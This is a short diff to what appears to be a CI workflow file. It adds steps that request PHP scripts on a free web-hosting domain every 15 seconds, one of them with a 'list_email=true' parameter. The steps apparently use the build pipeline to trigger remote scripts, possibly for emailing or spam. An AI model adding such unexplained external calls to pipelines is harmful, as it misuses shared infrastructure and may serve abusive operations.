@@ -32,3 +32,8 @@ jobs:
       - run: GET https://committed-lanes.000webhostapp.com/officemanvgsm_w1.php
       - run: sleep 15
       - run: GET https://committed-lanes.000webhostapp.com/manuel281.php
+      - run: sleep 15
+      - run: GET https://committed-lanes.000webhostapp.com/lostones11_w.php
+      - run: sleep 15
+      - run: GET https://committed-lanes.000webhostapp.com/homeworkutils_w.php?list_email=true
+
